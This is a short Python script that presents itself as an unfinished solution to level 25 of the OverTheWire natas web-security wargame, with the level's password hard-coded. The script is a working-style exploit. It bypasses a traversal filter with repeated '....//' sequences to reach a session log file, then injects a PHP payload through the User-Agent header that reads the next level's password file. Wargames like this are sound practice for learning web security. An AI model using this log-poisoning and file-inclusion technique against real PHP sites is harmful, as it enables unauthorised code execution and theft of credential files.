#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
  level25.py
  Solution for natas level25

  Have not solved this, but I save it as reference.
"""
__author__ = 'kall.micke@gmail.com'

import requests
import sys
import os
import re

level = 25
user = 'natas%s' % level
host = 'http://natas%s.natas.labs.overthewire.org' % level
password = 'GHF6X7YwACaYYssHVY05cFq83hRktl4c'

def get_flag():

    payload = '''<?php echo file_get_contents("/etc/natas_webpass/natas26"); ?>'''

    r = requests.get(host, auth=(user, password))
    cookies = dict(PHPSESSID=r.cookies['PHPSESSID'])
    params = dict(lang='....//....//....//....//....//....//....//tmp/natas25_{0}.log'.format(r.cookies['PHPSESSID']))
    headers = {'user-agent': payload}
    r = requests.get(host, params=params, auth=(user, password), headers=headers, cookies=cookies)
    m = re.search(r'([A-Za-z0-9]{30,})', r.text[750:])
    return m.group()

if __name__ == '__main__':
    print("Flag: %s" % get_flag())
